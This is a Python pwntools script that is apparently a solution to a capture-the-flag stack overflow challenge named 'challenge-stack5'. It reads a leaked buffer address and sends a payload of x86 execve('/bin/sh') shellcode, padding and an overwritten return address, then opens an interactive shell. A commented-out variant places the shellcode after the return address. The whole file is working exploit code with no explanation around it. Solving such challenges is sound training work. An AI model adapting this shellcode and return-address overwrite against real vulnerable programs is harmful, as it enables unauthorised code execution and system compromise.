from pwn import *

# Connect to the remote process
conn = remote('chal.sigpwny.com', 1356)
# conn = process('./challenge-stack5')

# get buffer address
conn.recvuntil('&buf = ')
BUF_ADDR = int(conn.recvline().strip(), 16)
# print('BUF_ADDR =', BUF_ADDR)

# # shellcode
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# payload
exploit = b""
exploit += shellcode
exploit += b"A" * (0x2c - len(shellcode))
exploit += p32(BUF_ADDR)

# # can also inject shellcode after return address
# exploit = b""
# exploit += b"A" * 0x2c
# exploit += p32(BUF_ADDR + 0x2c + 0x4) # 0x4 is length of return address
# exploit += shellcode


# send payload
conn.sendline(exploit)

# get shell
conn.interactive()


